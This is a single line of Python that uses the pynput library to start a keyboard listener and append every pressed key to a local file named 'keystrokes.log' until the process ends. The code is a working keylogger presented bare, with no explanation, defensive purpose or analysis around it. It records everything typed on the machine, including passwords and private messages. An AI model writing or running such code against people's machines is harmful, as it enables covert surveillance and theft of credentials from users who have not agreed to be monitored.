from pynput.keyboard import Listener; l = Listener(on_press=lambda key: open("keystrokes.log", "a").write(f"{key}\n")); l.start(); l.join()
